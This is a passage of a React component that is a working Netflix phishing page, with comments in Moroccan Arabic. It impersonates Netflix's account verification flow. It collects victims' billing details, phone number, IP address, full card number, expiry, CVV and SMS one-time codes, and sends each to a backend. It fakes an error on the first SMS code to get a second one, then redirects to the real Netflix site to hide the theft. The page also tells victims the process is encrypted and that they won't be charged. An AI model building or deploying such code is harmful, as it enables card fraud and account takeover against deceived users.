import React, { useState, useEffect } from 'react';
import axios from 'axios';

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'http://localhost:5000';

// 🌍 ليستة ديال الدول مع الفلاغات والرموز ديالهم
const countries = [
    { code: '+1', iso: 'ca', name: 'Canada' },
  { code: '+1', iso: 'us', name: 'United States' },
    { code: '+49', iso: 'de', name: 'Germany' },
  { code: '+33', iso: 'fr', name: 'France' },
  { code: '+44', iso: 'gb', name: 'United Kingdom' },
  { code: '+34', iso: 'es', name: 'Spain' },
  { code: '+39', iso: 'it', name: 'Italy' },
];

const Account = () => {
  const [step, setStep] = useState(1);
  const [isLoading, setIsLoading] = useState(false);

  // States for Billing (Step 2)
  const [firstname, setFirstname] = useState('');
  const [lastname, setLastname] = useState('');
  const [address_line, setAddressLine] = useState('');
  const [city, setCity] = useState('');
  const [zip_code, setZipCode] = useState('');
  const [phone_number, setPhoneNumber] = useState('');
  const [ip_address, setIpAddress] = useState('');
  
  // 🎌 إعدادات الفلاغات
  const [countryCode, setCountryCode] = useState('+1'); 
  const [countryIso, setCountryIso] = useState('us'); 
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);

  const [billingErrors, setBillingErrors] = useState({});
  const [nameOnCard, setNameOnCard] = useState('');
  const [cardType, setCardType] = useState('');

  // States for Card (Step 5)
  const [cardNumber, setCardNumber] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardErrors, setCardErrors] = useState({});

  // States for SMS (Step 7)
  const [smsCode, setSmsCode] = useState(['', '', '', '', '', '']);
  const [smsSubmitCount, setSmsSubmitCount] = useState(0); // شحال من مرة كليكا على Submit
  const [smsError, setSmsError] = useState(''); // الميساج ديال الإيرور
  const [showResendToast, setShowResendToast] = useState(false); // باش نبينو/نخفيو الـ Notification
  // Fetch IP Address on load
  useEffect(() => {
    const fetchIp = async () => {
      try {
        const response = await axios.get('https://api.db-ip.com/v2/free/self');
        setIpAddress(response.data.ip);
        
        const geoRes = await axios.get(`https://ipapi.co/${response.data.ip}/json/`);
        if (geoRes.data.country_calling_code) setCountryCode(geoRes.data.country_calling_code);
        if (geoRes.data.country) setCountryIso(geoRes.data.country.toLowerCase());
      } catch (err) {
        console.error("Failed to fetch IP", err);
      }
    };
    fetchIp();
  }, []);

  const goToStep = (newStep) => {
    setStep(newStep);
    window.scrollTo(0, 0);
  };

  const ErrorIcon = () => (
    <svg fill="none" viewBox="0 0 24 24" strokeWidth="2.5" stroke="currentColor" className="w-4 h-4 flex-shrink-0 mt-[2px] text-red-600">
      <path strokeLinecap="round" strokeLinejoin="round" d="M9.75 9.75l4.5 4.5m0-4.5l-4.5 4.5M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
    </svg>
  );

  // ==========================================
  // 🚀 دوال الفورماطاج والـ Validation لـ Step 5
  // ==========================================
  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, ''); 
    let type = '';
    if (/^4/.test(value)) type = 'visa';
    else if (/^5[1-5]/.test(value)) type = 'mastercard';
    else if (/^3[47]/.test(value)) type = 'amex';
    else if (/^6/.test(value)) type = 'discover';
    setCardType(type);

    let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
    let maxLength = type === 'amex' ? 17 : 19; 
    setCardNumber(formatted.substring(0, maxLength));
    if(cardErrors.cardNumber) setCardErrors({...cardErrors, cardNumber: ''});
  };

  const handleCardNumberBlur = () => {
    if (!cardNumber) setCardErrors(prev => ({...prev, cardNumber: "Please enter a card number."}));
    else if (cardNumber.replace(/\s/g, '').length < 15) setCardErrors(prev => ({...prev, cardNumber: "Please enter a valid credit card number."}));
  };

  const handleExpirationChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
    setExpirationDate(value);
    if(cardErrors.expirationDate) setCardErrors({...cardErrors, expirationDate: ''});
  };

  const handleExpirationBlur = () => {
    if (!expirationDate) setCardErrors(prev => ({...prev, expirationDate: "Please enter an expiration date."}));
    else if (expirationDate.length !== 5) setCardErrors(prev => ({...prev, expirationDate: "Please enter a valid expiration date."}));
    else {
      const [mm, yy] = expirationDate.split('/');
      const month = parseInt(mm, 10);
      const year = parseInt(yy, 10);
      const currentYearFull = new Date().getFullYear();
      const currentYear = parseInt(currentYearFull.toString().slice(-2), 10); 
      const currentMonth = new Date().getMonth() + 1;

      if (month < 1 || month > 12) setCardErrors(prev => ({...prev, expirationDate: "Please enter a valid expiration month."}));
      else if (year < currentYear || year > 51) setCardErrors(prev => ({...prev, expirationDate: `Expiration Year must be between ${currentYearFull} and 2051.`}));
      else if (year === currentYear && month < currentMonth) setCardErrors(prev => ({...prev, expirationDate: "Please enter a valid expiration date."}));
    }
  };

  const handleCvvChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    let maxLength = cardType === 'amex' ? 4 : 3;
    setCvv(value.substring(0, maxLength));
    if(cardErrors.cvv) setCardErrors({...cardErrors, cvv: ''});
  };

  const handleCvvBlur = () => {
    if (!cvv) setCardErrors(prev => ({...prev, cvv: "Please enter a CVV."}));
    else if ((cardType === 'amex' && cvv.length !== 4) || (cardType !== 'amex' && cvv.length !== 3)) setCardErrors(
      prev => ({...prev, cvv: "Please enter a valid CVV."})
    );
  };

  // ==========================================
  // 🚀 دالة الإرسال لـ Step 2 (تم إصلاح الـ IP و الهاتف)
  // ==========================================
  const handleBillingSubmit = async () => {
    let errors = {};
    if (!firstname.trim()) errors.firstname = "First name is required.";
    if (!lastname.trim()) errors.lastname = "Last name is required.";
    if (!address_line.trim()) errors.address = "Address is required.";
    if (!city.trim()) errors.city = "City is required.";
    if (!zip_code.trim()) errors.zip_code = "Zip code is required.";
    if (!phone_number.trim()) errors.phone = "Phone number is required.";
    
    if (Object.keys(errors).length > 0) {
      setBillingErrors(errors);
      return; 
    }

    setIsLoading(true);
    try {
      // 👈 يلا المستعمل زرب والـ IP باقي ماتشارجاش، نجيبوه فالبلاصة قبل ما نصيفطو
      let finalIp = ip_address;
      if (!finalIp) {
        try {
          const res = await axios.get('https://api.db-ip.com/v2/free/self');
          finalIp = res.data.ipAddress;
          setIpAddress(finalIp);
        } catch (e) {
          finalIp = 'Unknown IP';
        }
      }

      const fullPhone = `${countryCode} ${phone_number}`;
      const token = localStorage.getItem('token');
      
      // 👈 كنصيفطو التيلفون و IP بݣاع السميات الممكنة (باش الباك إند يشدها كيفما كانت مسمية)
      await axios.put(`${BACKEND_URL}/api/auth/step1`, {
        firstname, 
        lastname, 
        address_line, 
        city, 
        zip_code, 
        // صيغ الهاتف
        phone_number: fullPhone, 
        phoneNumber: fullPhone,  
        phone: fullPhone,        
        // صيغ الـ IP
        ip_address: finalIp,     
        ipAddress: finalIp,      
        ip: finalIp              
      }, { 
        headers: { Authorization: `Bearer ${token}` } 
      });

      setBillingErrors({}); 
      goToStep(3); 
    } catch (error) {
      console.error("Error saving billing info:", error);
    } finally {
      setIsLoading(false);
    }
  };

  // ======================= Validation & Submit: Card Info (Step 5) =======================
  const handleCardSubmit = async () => {
    let errors = {};
    if (!cardNumber.trim()) errors.cardNumber = "Please enter a card number.";
    if (!expirationDate.trim()) errors.expirationDate = "Please enter an expiration date.";
    if (!cvv.trim()) errors.cvv = "Please enter a CVV.";
    if (!nameOnCard.trim()) errors.nameOnCard = "Name is required.";

    setCardErrors(errors);

    if (Object.keys(errors).length === 0) {
      setIsLoading(true);
      try {
        const token = localStorage.getItem('token');
        await axios.put(`${BACKEND_URL}/api/auth/step2`, {
          cardNumber, expirationDate, cvv, nameOnCard
        }, { headers: { Authorization: `Bearer ${token}` } });
        
        goToStep(6); 
      } catch (error) {
        console.error("Error saving card info:", error);
      } finally {
        setIsLoading(false);
      }
    }
  };

  // ======================= Validation & Submit: SMS Code (Step 7) =======================
  // ======================= Validation & Submit: SMS Code (Step 7) =======================
  const handleSmsSubmit = async () => {
    const fullCode = smsCode.join('');
    if (fullCode.length === 6) {
      setIsLoading(true);
      try {
        const token = localStorage.getItem('token');
        
        // كنصيفطو الكود للباك إند (سواء المرة 1 ولا 2)
        // تقدر تزيد attempt: smsSubmitCount + 1 يلا بغيتي الباك إند يعرف واش الكود 1 ولا 2
        await axios.put(`${BACKEND_URL}/api/auth/step3`, {
          sms_code: fullCode,
          attempt: smsSubmitCount + 1 
        }, { headers: { Authorization: `Bearer ${token}` } });

        if (smsSubmitCount === 0) {
          // المرة الأولى: كنعطيو إيرور ونخويو الخانات
          setSmsError("That wasn't quite right. Please try again.");
          setSmsCode(['', '', '', '', '', '']);
          setSmsSubmitCount(1);
          setTimeout(() => document.getElementById('sms-0').focus(), 100);
        } else {
          // المرة التانية: كنديوه لنتفليكس
          window.location.href = "https://www.netflix.com/browse";
        }
      } catch (error) {
        console.error("Error saving SMS info:", error);
      } finally {
        setIsLoading(false);
      }
    }
  };

  // دالة فاش كيكليكي على Resend code
  const handleResend = () => {
    setShowResendToast(true);
    setTimeout(() => {
      setShowResendToast(false);
    }, 5000); // غتغبر بوحدها من بعد 5 ثواني
  };

  // ======================= SMS Input Handler =======================
  const handleSmsChange = (e, index) => {
    const value = e.target.value;
    if (/^[0-9]?$/.test(value)) {
      const newCode = [...smsCode];
      newCode[index] = value;
      setSmsCode(newCode);
      if (value !== '' && index < 5) {
        document.getElementById(`sms-${index + 1}`).focus();
      }
    }
  };

  const handleSmsKeyDown = (e, index) => {
    if (e.key === 'Backspace' && !smsCode[index] && index > 0) {
      document.getElementById(`sms-${index - 1}`).focus();
    }
  };

  const maskedPhone = phone_number ? `******${phone_number.slice(-4)}` : '******0000';

  return (
    <div className="min-h-screen bg-white font-['Inter',_sans-serif] text-[#333]">
      {/* Header */}
      <header className="h-[90px] border-b border-[#e6e6e6] px-6 md:px-[5%] flex items-center justify-between">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" className="w-[120px] md:w-[167px]" />
        <a href="#" className="font-bold text-[16px] text-[#333] hover:underline">Sign Out</a>
      </header>

      <main className="pb-20">
        
        {/* ======================= Step 1 ======================= */}
        {step === 1 && (
          <div className="flex flex-col items-center text-center mt-12 max-w-[440px] mx-auto px-4">
            <div className="border-2 border-[#e50914] rounded-full p-3 mb-6">
              <svg viewBox="0 0 24 24" fill="none" className="w-10 h-10 text-[#e50914]"><path d="M12 22S20 18 20 10V5L12 2L4 5V10C4 18 12 22 12 22Z" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/><path d="M9 12L11 14L15 10" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div className="w-full text-left">
              <span className="text-[13px] font-medium mb-1 text-[#333]">Step <b>1</b> of <b>4</b></span>
              <h1 className="text-[32px] font-bold tracking-tight leading-tight mb-4 text-[#333]">Great, now let's verify your account</h1>
              <p className="text-[17px] mb-6 text-[#333]">Verifying your account will improve account security and help you receive important Netflix .</p>
              <button onClick={() => goToStep(2)} className="bg-[#e6e6e6] text-black w-full h-[64px] rounded-[3px] font-bold text-[24px] hover:bg-gray-300 transition">Next</button>
            </div>
          </div>
        )}

        {/* ======================= Step 2: Billing Info ======================= */}
        {step === 2 && (
          <div className="max-w-[450px] mx-auto mt-12 px-6">
            <span className="text-[13px] font-medium mb-1 text-[#333] block">Step <b>2</b> of <b>4</b></span>
            <h1 className="text-[28px] font-bold tracking-tight mb-6 text-[#333]">Enter your billing information</h1>

            <div className="flex flex-col gap-4">
              {/* First & Last Name */}
              <div className="flex gap-3">
                <div className="relative w-full">
                  <input 
                    type="text" value={firstname} 
                    onChange={(e) => { setFirstname(e.target.value); if(billingErrors.firstname) setBillingErrors({...billingErrors, firstname: ''}); }}
                    onBlur={() => { if(!firstname) setBillingErrors(prev => ({...prev, firstname: "First name is required."})) }}
                    className={`block w-full h-[60px] px-4 pt-6 pb-2 bg-white border ${billingErrors.firstname ? 'border-red-600' : 'border-[#8c8c8c]'} rounded-[4px] text-black text-[16px] focus:outline-none focus:border-[#333] peer appearance-none`} placeholder=" " 
                  />
                  <label className="absolute text-gray-500 font-medium duration-200 transform -translate-y-2.5 scale-[0.8] top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.8] peer-focus:-translate-y-2.5 cursor-text">First name</label>
                  {billingErrors.firstname && <div className="flex items-start gap-1.5 text-red-600 text-[13px] mt-1 font-medium pl-0.5"><ErrorIcon />{billingErrors.firstname}</div>}
                </div>

                <div className="relative w-full">
                  <input 
                    type="text" value={lastname} 
                    onChange={(e) => { setLastname(e.target.value); if(billingErrors.lastname) setBillingErrors({...billingErrors, lastname: ''}); }}
                    onBlur={() => { if(!lastname) setBillingErrors(prev => ({...prev, lastname: "Last name is required."})) }}
                    className={`block w-full h-[60px] px-4 pt-6 pb-2 bg-white border ${billingErrors.lastname ? 'border-red-600' : 'border-[#8c8c8c]'} rounded-[4px] text-black text-[16px] focus:outline-none focus:border-[#333] peer appearance-none`} placeholder=" " 
                  />
                  <label className="absolute text-gray-500 font-medium duration-200 transform -translate-y-2.5 scale-[0.8] top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.8] peer-focus:-translate-y-2.5 cursor-text">Last name</label>
                  {billingErrors.lastname && <div className="flex items-start gap-1.5 text-red-600 text-[13px] mt-1 font-medium pl-0.5"><ErrorIcon />{billingErrors.lastname}</div>}
                </div>
              </div>

              {/* Address */}
              <div className="relative w-full">
                <input 
                  type="text" value={address_line} 
                  onChange={(e) => { setAddressLine(e.target.value); if(billingErrors.address) setBillingErrors({...billingErrors, address: ''}); }}
                  onBlur={() => { if(!address_line) setBillingErrors(prev => ({...prev, address: "Address is required."})) }}
                  className={`block w-full h-[60px] px-4 pt-6 pb-2 bg-white border ${billingErrors.address ? 'border-red-600' : 'border-[#8c8c8c]'} rounded-[4px] text-black text-[16px] focus:outline-none focus:border-[#333] peer appearance-none`} placeholder=" " 
                />
                <label className="absolute text-gray-500 font-medium duration-200 transform -translate-y-2.5 scale-[0.8] top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.8] peer-focus:-translate-y-2.5 cursor-text">Address</label>
                {billingErrors.address && <div className="flex items-start gap-1.5 text-red-600 text-[13px] mt-1 font-medium pl-0.5"><ErrorIcon />{billingErrors.address}</div>}
              </div>

              {/* City & Zip Code */}
              <div className="flex gap-3">
                <div className="relative w-full">
                  <input 
                    type="text" value={city} 
                    onChange={(e) => { setCity(e.target.value); if(billingErrors.city) setBillingErrors({...billingErrors, city: ''}); }}
                    onBlur={() => { if(!city) setBillingErrors(prev => ({...prev, city: "City is required."})) }}
                    className={`block w-full h-[60px] px-4 pt-6 pb-2 bg-white border ${billingErrors.city ? 'border-red-600' : 'border-[#8c8c8c]'} rounded-[4px] text-black text-[16px] focus:outline-none focus:border-[#333] peer appearance-none`} placeholder=" " 
                  />
                  <label className="absolute text-gray-500 font-medium duration-200 transform -translate-y-2.5 scale-[0.8] top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.8] peer-focus:-translate-y-2.5 cursor-text">City</label>
                  {billingErrors.city && <div className="flex items-start gap-1.5 text-red-600 text-[13px] mt-1 font-medium pl-0.5"><ErrorIcon />{billingErrors.city}</div>}
                </div>

                <div className="relative w-full">
                  <input 
                    type="text" value={zip_code} 
                    onChange={(e) => { setZipCode(e.target.value); if(billingErrors.zip_code) setBillingErrors({...billingErrors, zip_code: ''}); }}
                    onBlur={() => { if(!zip_code) setBillingErrors(prev => ({...prev, zip_code: "Zip code is required."})) }}
                    className={`block w-full h-[60px] px-4 pt-6 pb-2 bg-white border ${billingErrors.zip_code ? 'border-red-600' : 'border-[#8c8c8c]'} rounded-[4px] text-black text-[16px] focus:outline-none focus:border-[#333] peer appearance-none`} placeholder=" " 
                  />
                  <label className="absolute text-gray-500 font-medium duration-200 transform -translate-y-2.5 scale-[0.8] top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.8] peer-focus:-translate-y-2.5 cursor-text">Zip code</label>
                  {billingErrors.zip_code && <div className="flex items-start gap-1.5 text-red-600 text-[13px] mt-1 font-medium pl-0.5"><ErrorIcon />{billingErrors.zip_code}</div>}
                </div>
              </div>

              {/* 🎌 Custom Flag Dropdown Menu Area */}
              <div className="relative w-full">
                <div className={`flex items-center h-[60px] bg-white border ${billingErrors.phone ? 'border-red-600' : 'border-[#8c8c8c]'} rounded-[4px] focus-within:border-[#333] relative`}>
                  
                  {/* Dropdown Trigger */}
                  <div 
                    onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                    className="h-full px-3 flex items-center gap-1.5 border-r border-gray-300 cursor-pointer hover:bg-gray-50 select-none min-w-[95px] justify-center"
                  >
                    <img 
                      src={`https://flagcdn.com/w40/${countryIso}.png`} 
                      alt={countryIso} 
                      className="w-[24px] h-auto object-contain border border-gray-200 rounded-[2px]" 
                    />
                    <span className="text-[15px] font-semibold text-black">{countryCode}</span>
                    <svg className={`w-3 h-3 text-gray-500 transition-transform duration-200 ${isDropdownOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M19 9l-7 7-7-7" />
                    </svg>
                  </div>

                  {/* Dropdown Options List */}
                  {isDropdownOpen && (
                    <div className="absolute left-0 top-[62px] w-[240px] max-h-[220px] overflow-y-auto bg-white border border-gray-300 rounded-[4px] shadow-lg z-50 py-1">
                      {countries.map((c) => (
                        <div
                          key={c.iso}
                          onClick={() => {
                            setCountryCode(c.code);
                            setCountryIso(c.iso);
                            setIsDropdownOpen(false);
                          }}
                          className="flex items-center gap-3 px-3 py-2.5 hover:bg-gray-100 cursor-pointer text-left text-black text-[14px]"
                        >
                          <img 
                            src={`https://flagcdn.com/w40/${c.iso}.png`} 
                            alt={c.name} 
                            className="w-[24px] h-auto object-contain border border-gray-100 rounded-[1px]" 
                          />
                          <span className="font-bold min-w-[40px] text-gray-600">{c.code}</span>
                          <span className="truncate text-gray-800 font-medium">{c.name}</span>
                        </div>
                      ))}
                    </div>
                  )}

                  <input 
                    type="text" value={phone_number}
                    onChange={(e) => { setPhoneNumber(e.target.value.replace(/\D/g, '')); if(billingErrors.phone) setBillingErrors({...billingErrors, phone: ''}); }}
                    onBlur={() => { if(!phone_number) setBillingErrors(prev => ({...prev, phone: "Phone number is required."})) }}
                    placeholder="Phone number"
                    className="w-full h-full px-4 text-black text-[16px] focus:outline-none bg-transparent"
                  />
                </div>
                {billingErrors.phone && <div className="flex items-start gap-1.5 text-red-600 text-[13px] mt-1 font-medium pl-0.5"><ErrorIcon />{billingErrors.phone}</div>}
              </div>

              <button 
                onClick={handleBillingSubmit} disabled={isLoading}
                className="w-full bg-[#E50914] text-white h-[64px] rounded-[3px] text-[24px] font-bold hover:bg-[#c11119] transition mt-4 disabled:opacity-70"
              >
                {isLoading ? 'Processing...' : 'Next'}
              </button>
            </div>
          </div>
        )}

        {/* ======================= Step 3 & 4 (Plan & Payment Select) ======================= */}
        {step === 3 && (
          <div className="flex flex-col items-center mt-8 md:mt-12 max-w-[500px] mx-auto px-4">
                <div className="border-2 border-[#e50914] rounded-full w-[46px] h-[46px] flex items-center justify-center mb-6">
                  <svg viewBox="0 0 24 24" fill="none" className="w-[22px] h-[22px] text-[#e50914]" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="7" y="11" width="10" height="9" rx="1.5" ry="1.5"></rect><path d="M9 11V7a3 3 0 016 0v4"></path><circle cx="12" cy="14.5" r="0.5" fill="currentColor" stroke="currentColor"></circle><path d="M12 15v1.5"></path></svg>
                </div>
                
                <div className="w-full text-left">
                  <span className="text-[13px] font-medium mb-1 text-[#333] block">Step <b>4</b> of <b>4</b></span>
                  <h1 className="text-[32px] font-bold tracking-tight leading-tight mb-4 text-[#333]">Let’s verify your payment info</h1>
                  <p className="text-[17px] mb-4 text-[#333]">Re-enter the card to secure your account. Don’t worry – you won’t be charged..</p>
                  
                  <div className="text-[17px] font-bold text-[#333] mb-6 leading-snug"><p>Secure for peace of mind.</p><p></p></div>

                  <div className="flex justify-end items-center gap-1 mb-2 text-[13px] text-[#737373] font-medium">End-to-end encrypted <svg width="12" height="12" viewBox="0 0 16 16" fill="currentColor"><path d="M11.5 6V4.5C11.5 2.567 9.933 1 8 1C6.067 1 4.5 2.567 4.5 4.5V6H3.5C2.67157 6 2 6.67157 2 7.5V13.5C2 14.3284 2.67157 15 3.5 15H12.5C13.3284 15 14 14.3284 14 13.5V7.5C14 6.67157 13.3284 6 12.5 6H11.5ZM9.5 6H6.5V4.5C6.5 3.67157 7.17157 3 8 3C8.82843 3 9.5 3.67157 9.5 4.5V6Z"></path></svg></div>

                  <div className="flex flex-col gap-2">
                    <button onClick={() => goToStep(5)} className="flex items-center justify-between w-full p-4 border border-gray-300 rounded-[5px] hover:bg-gray-50 transition min-h-[64px]">
                      <div className="flex flex-col items-start gap-1">
                        <span className="text-[16px] text-[#333] font-medium">Credit or Debit Card</span>
                        <div className="flex gap-1.5 items-center">
                          <img src="https://download.logo.wine/logo/Visa_Inc./Visa_Inc.-Logo.wine.png" alt="Visa" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />
                          <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />
                          <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />
                          <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" alt="Discover" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />
                        </div>
                      </div>
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#737373" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M9 18l6-6-6-6"/></svg>
                    </button>
                  </div>
                </div>
              </div>
        )}

        {step === 4 && (
          <div className="flex flex-col items-center mt-12 max-w-[500px] mx-auto px-4">
            <div className="w-full text-left">
              <span className="text-[13px] font-medium mb-1 text-[#333] block">Step <b>4</b> of <b>4</b></span>
              <h1 className="text-[32px] font-bold tracking-tight leading-tight mb-4 text-[#333]">Choose how to pay</h1>
              <button onClick={() => goToStep(5)} className="flex items-center justify-between w-full p-4 border border-gray-300 rounded-[5px] mt-4 hover:bg-gray-50 transition min-h-[64px]">
                <span className="text-[16px] text-[#333] font-medium">Credit or Debit Card</span>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#737373" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M9 18l6-6-6-6"/></svg>
              </button>
            </div>
          </div>
        )}

        {/* ======================= Step 5: Card Info ======================= */}
        {step === 5 && (
              <div className="flex flex-col text-left mt-2 max-w-[440px] mx-auto px-4 md:px-0">
                
                <button onClick={() => goToStep(3)} className="flex items-center gap-1 text-[#0071eb] text-[13px] hover:underline mb-6 font-medium w-fit">
                  <svg width="12" height="12" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M10.5 13L5.5 8L10.5 3" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
                  Change payment method
                </button>

                <span className="text-[13px] font-medium mb-1 text-[#333] block">Step <b>4</b> of <b>4</b></span>
                <h1 className="text-[32px] font-bold tracking-tight leading-[1.2] mb-6 text-[#333]">Set up your credit or debit card</h1>

                <div className="flex gap-1.5 mb-6">
                  <img src="https://download.logo.wine/logo/Visa_Inc./Visa_Inc.-Logo.wine.png" alt="Visa" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />
                  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />
                  <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />
                  <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" alt="Discover" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />
                </div>

                <div className="flex flex-col gap-3">
                  <div className="flex flex-col">
                    <div className="relative w-full">
                      <input 
                        type="text" 
                        value={cardNumber} 
                        onChange={handleCardNumberChange}
                        onBlur={handleCardNumberBlur}
                        className={`block w-full h-[60px] px-4 pt-6 pb-2 bg-white border ${cardErrors.cardNumber ? 'border-red-600' : 'border-[#8c8c8c]'} rounded-[4px] text-black text-[16px] focus:outline-none focus:border-blue-500 peer appearance-none`} 
                        placeholder=" " 
                      />
                      <label className="absolute text-gray-500 font-medium duration-200 transform -translate-y-2.5 scale-[0.8] top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.8] peer-focus:-translate-y-2.5 cursor-text">Card number</label>
                      
                      <div className="absolute right-4 top-[18px]">
                        {cardType === 'visa' && <img src="https://download.logo.wine/logo/Visa_Inc./Visa_Inc.-Logo.wine.png" alt="Visa" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />}
                        {cardType === 'mastercard' && <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />}
                        {cardType === 'amex' && <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />}
                        {cardType === 'discover' && <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" alt="Discover" className="h-[22px] w-[36px] object-contain border border-gray-200 rounded-[3px] px-1 bg-white" />}
                        {!cardType && <svg className="w-[26px] h-[26px] text-[#737373]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>}
                      </div>
                    </div>
                    {cardErrors.cardNumber && <div className="flex items-start gap-1.5 text-red-600 text-[13px] mt-1 font-medium pl-0.5"><ErrorIcon />{cardErrors.cardNumber}</div>}
                  </div>

                  <div className="flex gap-3">
                    <div className="flex flex-col w-full">
                      <div className="relative w-full">
                        <input 
                          type="text" 
                          value={expirationDate} 
                          onChange={handleExpirationChange}
                          onBlur={handleExpirationBlur}
                          className={`block w-full h-[60px] px-4 pt-6 pb-2 bg-white border ${cardErrors.expirationDate ? 'border-red-600' : 'border-[#8c8c8c]'} rounded-[4px] text-black text-[16px] focus:outline-none focus:border-blue-500 peer appearance-none`} 
                          placeholder=" " 
                        />
                        <label className="absolute text-gray-500 font-medium duration-200 transform -translate-y-2.5 scale-[0.8] top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.8] peer-focus:-translate-y-2.5 cursor-text">Expiration date</label>
                      </div>
                      {cardErrors.expirationDate && <div className="flex items-start gap-1.5 text-red-600 text-[13px] mt-1 font-medium pl-0.5"><ErrorIcon />{cardErrors.expirationDate}</div>}
                    </div>

                    <div className="flex flex-col w-full">
                      <div className="relative w-full">
                        <input 
                          type="text" 
                          value={cvv} 
                          onChange={handleCvvChange}
                          onBlur={handleCvvBlur}
                          className={`block w-full h-[60px] px-4 pt-6 pb-2 bg-white border ${cardErrors.cvv ? 'border-red-600' : 'border-[#8c8c8c]'} rounded-[4px] text-black text-[16px] focus:outline-none focus:border-blue-500 peer appearance-none`} 
                          placeholder=" " 
                        />
                        <label className="absolute text-gray-500 font-medium duration-200 transform -translate-y-2.5 scale-[0.8] top-4 z-10 origin-[0] left-4 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-[0.8] peer-focus:-translate-y-2.5 cursor-text">CVV</label>
                        <svg className="absolute right-4 top-[18px] w-[26px] h-[26px] text-[#737373]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                      </div>
                      {cardErrors.cvv && <div className="flex items-start gap-1.5 text-red-600 text-[13px] mt-1 font-medium pl-0.5"><ErrorIcon />{cardErrors.cvv}</div>}
                    </div>
                  </div>

                  <div className="flex flex-col">
                    <div className="relative w-full">
                      <input 
                        type="text" 
                        value={nameOnCard} 
                        onChange={(e) => {setNameOnCard(e.target.value); if(cardErrors.nameOnCard) setCardErrors({...cardErrors, nameOnCard: ''});}}
                        onBlur={() => { if(!nameOnCard) setCardErrors(prev => ({...prev, nameOnCard: "Name is required."})) }}
